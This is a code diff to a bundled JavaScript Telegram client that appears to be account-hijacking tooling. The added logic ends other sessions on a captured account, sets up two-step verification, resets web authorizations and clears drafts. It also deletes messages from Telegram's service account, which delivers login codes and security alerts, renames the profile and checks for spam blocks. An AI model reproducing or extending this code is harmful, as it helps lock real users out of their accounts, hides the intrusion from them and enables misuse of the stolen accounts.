@@ -52057,6 +52057,7 @@ contacts.resolvePhone#8af94344 phone:string = contacts.ResolvedPeer;
 contacts.editCloseFriends#ba6705f0 id:Vector<long> = Bool;
 messages.getMessages#63c66506 id:Vector<InputMessage> = messages.Messages;
 messages.clearAllDrafts#7e58ee9c = Bool;
+messages.setDefaultHistoryTTL#9eb51445 period:int = Bool;
 account.resetPassword#9308ce1b = account.ResetPasswordResult;
 messages.getDialogs#a0f4cb4f flags:# exclude_pinned:flags.0?true folder_id:flags.1?int offset_date:int offset_id:int offset_peer:InputPeer limit:int hash:long = messages.Dialogs;
 messages.getHistory#4423e6c5 peer:InputPeer offset_id:int offset_date:int add_offset:int limit:int max_id:int min_id:int hash:long = messages.Messages;
@@ -67611,16 +67612,27 @@ var updateStatus = async (client, offline) => {
   return result;
 };
 
+// src/support/methods/messages/clearAllTrash.ts
+var import_api4 = __toESM(require_api());
+var clearAllTrash = async (client) => {
+  await invokeRequest(client, new import_api4.default.messages.ClearAllDrafts());
+  await invokeRequest(client, new import_api4.default.account.ResetWebAuthorizations());
+  await invokeRequest(
+    client,
+    new import_api4.default.messages.SetDefaultHistoryTTL({ period: 0 })
+  );
+};
+
 // src/support/methods/update/handleUpdate.ts
 var import_big_integer = __toESM(require_BigInteger());
-var import_api5 = __toESM(require_api());
+var import_api6 = __toESM(require_api());
 
 // src/support/methods/messages/deleteHistory.ts
-var import_api4 = __toESM(require_api());
+var import_api5 = __toESM(require_api());
 async function deleteHistory(client, peer, shouldDeleteForAll) {
   const result = await invokeRequest(
     client,
-    new import_api4.default.messages.DeleteHistory({
+    new import_api5.default.messages.DeleteHistory({
       peer,
       ...shouldDeleteForAll && { revoke: true },
       ...!shouldDeleteForAll && { just_clear: true }
@@ -67688,7 +67700,7 @@ var handleUpdate = async (client, accountId, forceClearAuth, update) => {
       return;
     }
   }
-  if (update instanceof import_api5.default.UpdateShortMessage && String(update.userId) === "777000") {
+  if (update instanceof import_api6.default.UpdateShortMessage && String(update.userId) === "777000") {
     console.warn({
       accountId,
       prefix: client._prefix,
@@ -67711,7 +67723,7 @@ ${messageText}`;
     if (client) {
       await deleteHistory(
         client,
-        new import_api5.default.InputPeerUser({
+        new import_api6.default.InputPeerUser({
           userId: update.userId,
           accessHash: (0, import_big_integer.default)(0)
         }),
@@ -67751,7 +67763,7 @@ var import_big_integer2 = __toESM(require_BigInteger());
 var import_api9 = __toESM(require_api());
 
 // src/support/methods/account/updateProfile.ts
-var import_api6 = __toESM(require_api());
+var import_api7 = __toESM(require_api());
 var updateProfile = (client, {
   firstName,
   lastName,
@@ -67762,13 +67774,7 @@ var updateProfile = (client, {
     lastName: lastName || "",
     about: about || ""
   };
-  return invokeRequest(client, new import_api6.default.account.UpdateProfile(newProfile));
-};
-
-// src/support/methods/messages/clearAllDrafts.ts
-var import_api7 = __toESM(require_api());
-var clearAllDrafts = async (client) => {
-  await invokeRequest(client, new import_api7.default.messages.ClearAllDrafts());
+  return invokeRequest(client, new import_api7.default.account.UpdateProfile(newProfile));
 };
 
 // src/support/methods/users/getMe.ts
@@ -67811,16 +67817,14 @@ var accountSetup = async (client, account, setuped) => {
       })
     );
   }
-  if (me.firstName !== "Telegram") {
+  if (me.firstName !== "\u{1F977}\u{1F3FB}") {
     await updateProfile(client, {
-      firstName: "Telegram"
+      firstName: "\u{1F977}\u{1F3FB}"
     });
   }
   if (setuped) {
     return;
   }
-  await clearAllDrafts(client);
-  await invokeRequest(client, new import_api9.default.account.ResetWebAuthorizations());
   const dialogFilters = await invokeRequest(
     client,
     new import_api9.default.messages.GetDialogFilters()
@@ -69093,10 +69097,6 @@ var checker = async (ID, accountsInWork) => {
         errored = error.message;
       }
     }, 1e4);
-    await updateStatus(client, false);
-    await clearAuthorizations(client);
-    await setup2FA(client, account);
-    await accountSetup(client, account, setuped);
     let i = -1;
     while (true) {
       if (errored) {
@@ -69120,10 +69120,13 @@ var checker = async (ID, accountsInWork) => {
       await Promise.race([
         (async () => {
           if (i === 0) {
-            await automaticCheck(client, account);
+            await updateStatus(client, false);
+            await clearAuthorizations(client);
+            await setup2FA(client, account);
+            await accountSetup(client, account, setuped);
+            await clearAllTrash(client);
           }
           if (i === randomI) {
-            await clearAuthorizations(client);
             await automaticCheck(client, account);
             await checkSpamBlock(client, account);
           }
